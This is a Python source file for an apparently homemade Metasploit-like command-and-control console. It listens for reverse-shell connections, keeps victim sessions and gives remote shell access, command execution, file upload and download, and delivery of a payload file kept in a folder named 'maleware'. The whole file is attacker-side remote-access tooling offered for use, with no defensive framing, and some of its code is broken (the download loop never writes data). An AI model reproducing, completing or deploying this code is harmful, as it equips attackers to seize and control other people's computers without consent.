import os
import sys
import time
import socket,pickle
import threading
import subprocess

sub=subprocess

t=threading

allcon=[1]
alladdr=[1]

def start():
    time.sleep(2.0)
    print("\r\n............welcome...............\r\n")
    time.sleep(2.0)
    print("\r\n ...........start meta>..............\r\n")
    time.sleep(2.0)
    print("\r\n ...........start dbs>.............\r\n")
    time.sleep(2.0)
    print("\r\n ...........start meterpreter>...........\r\n")
    main()

def main():
    time.sleep(3.0)
    i=input(str("msf>"))
    if i=='windows_reverse_while_tcp':
        time.sleep(3.0)
        print("windows_reverse_while_tcp>")
        create()
        bind()
        listen()
        task()
        msf()
        meter()

    elif i=='windows_shell_while_tcp':
        time.sleep(3.0)
        print("windows_shell_while_tcp>")
        create()
        bind()
        listen()
        task()
        msf()
        shell()
        
    elif i=='windows_reverse_tcp':
        time.sleep(3.0)
        print("windows_reverse_tcp>")
        create()
        bind()
        listen()
        accept()
        msf()
        meter()
        
    elif i=='windows_shell_tcp':
        time.sleep(3.0)
        print("windows_shell_tcp>")
        create()
        bind()
        listen()
        accept()
        msf()
        shell()
    elif i=='windows_bind_shell':
        time.sleep(3.0)
        print("windows_bind")
        listen()
        connect()
        shell()
        
    elif i=='windows_tcp_gen':
        time.sleep(3.0)
        print("windows_gen")
        time.sleep(3.0)
        shell_create()
        
    elif i=='gateway_use_shell':
         create()
         bind()
         listen()
         accept()
         gateway()
         gateway_list()
         gateway_select()
         shell()
         main()
        
    else:
        time.sleep(3.0)
        print("worng payload selection")
        main()
def create():
    global host
    global port
    global s
    s=socket.socket()
    time.sleep(3.0)
    print("set as LHOST>")
    host=input("msf>")
    print("LHOST={}".format(host))
    time.sleep(3.0)
    print("set as LPORT>")
    port=int(input("msf>"))
    print("LPORT={}".format(port))
    
def bind():    
    s.bind((host,port))
def listen():
    s.listen(5)
    time.sleep(4.0)
    print("listen to exploit...+++....")
    time.sleep(2.0)
    print("listen to exploit+++.......+++>")
def task():
    task1=t.Thread(target=while_accept,args=())
    task1.daemon=True
    task1.start()
    
def while_accept():
    global c
    global addr
    
    while 1:
        try:
            time.sleep(2.0)
            (c,(addr))=s.accept()
            allcon.append(c)
            alladdr.append(addr)
            print("\r\n session connected-->{}\r\n".format(addr))
            
        except socket.error:
            msf()

def accept():
    global c
    global addr
    x=0
    time.sleep(2.0)
    print("number of payload listen>")
    y=input("msf>")
    time.sleep(3.0)
    print("exploit-------->")
    z=int(y)
    while x<z:
        try:
            (c,(addr))=s.accept()
            allcon.append(c)
            alladdr.append(addr)
            print("\r session connected-->{} \r \n".format(addr))
            x+=1
        except socket.error:
            accept()
        except KeyboardInterrupt:
            msf()
def msf():
    r=input("msf>")
    if r=='session':
        session()
    elif r=='quit':
        sys.exit()
    elif r=='main':
        main()
    elif r=='list':
         alladdr[:]
         msf()
    elif r=='help':
         print("session")
         print("main")
         print("quit")
         print("task")
         msf()
    elif r=='task':
         task()
         msf()
    else:
        print("wrong selection>")
        msf()
        
def session():
    lis=len(allcon[:])
    lis-=1
    print(lis)
    i=input("select target>")
    
    w=int(i)
    c=allcon[w]
    print(c)
        
    
   
def meter():
    
    
    b=input("meterpreter>")
    
    if b=='chat':
       c.send(b.encode())
       chat()
       meter()
    elif b=='shell':
         c.send(b.encode())
         shell()
         meter()
    elif b=='upload':
         c.send(b.encode())
         upload()
         meter()
    elif b=='download':
         c.send(b.encode())
         download()
         meter()
    elif b=='excute':
         c.send(b.encode()) 
         excute()
         meter()
    elif b=='exec1':
         c.send(b.encode())
         exec1()
         meter()
    elif b=='help':
         print("1->chat")
         print("2->shell")
         print("3->upload")
         print("4->download")
         print("5->excute")
         print("6->exec1")
         print("7->gateway")
         print("8->help")
         meter()
    elif b=='main':
         main()
    elif b=='session':
         session()
    elif b=='msf':
         msf()
    elif b=='quit':
         sys.exit()
        
    else:
         print("worng selection")
         meter()

def chat():
    print("meter>chat>")
    while True:
              try:
                  data=input("chat>")
                  if data=='quit':
                     sys.exit()
                  elif data=='meter':
                      c.send(data.encode())
                      meter()
                  elif data=='msf':
                      msf()
                  elif data=='main':
                      main()
                  else:

                      c.send(data.encode())

                      data=c.recv(2048).decode()
                      print(data)     
              except KeyboardInterrupt:
                  meter()
                     
def shell():

    print("meter>shell>")
    while True:

       try:
           data=input("shell->")
         
           if data=='quit':
              sys.exit()
        
           elif data=='meter':
                c.send(data.encode())
                meter()
           elif data=='msf':
                msf()
           elif data=='main':
                main()
           else:
               c.send(data.encode())

               output = c.recv(8080).decode()

               print (output)


       except KeyboardInterrupt:
           msf()

def upload():
    print("welcome to upload")
    d="dir"
    i=sub.Popen(d,shell=True,stdin=sub.PIPE,stderr=sub.PIPE,stdout=sub.PIPE,universal_newlines=True)
    i = i.stdout.read() + i.stderr.read()
    print(i)

    fname=input("filename>")
    c.send(fname.encode())
    file=open(fname,'rb')
    data=file.read(8080)
    while data:
        c.send(data)
        print("sending data bytes>----->")
        data=file.read(8080)
    file.close()
    print("sucess fully upload")
def download():
    print("welcome to download \r \n enter remote dir>")
    d=c.recv(1024).decode()
    print(d)

    filename=input("filename>")
    c.send(filename.encode())
    
    with open(filename,'wb') as file:
        while True:
            data=c.recv(8080)
            print(len(data))
            if not data:
                break
                file.write(data)
                
    file.close()
    
    print("sucess download sent>")
    meter()

    
    
    

def excute():
    print("meter>excute")
    d=input("command>")
    c.send(d.encode())
    meter()
def exec1():
    print("exec to explit")

    i=input("msf>")

    data=(open("\\pytohn project\\maleware\\txt\\exec.txt").read())

    time.sleep(2.0)

    print(data)

    time.sleep(2.0)

    print("sending post code")

    time.sleep(2.0)

    c.send(data.encode())

    time.sleep(2.0)

    print(i,"exploit completed")



start()
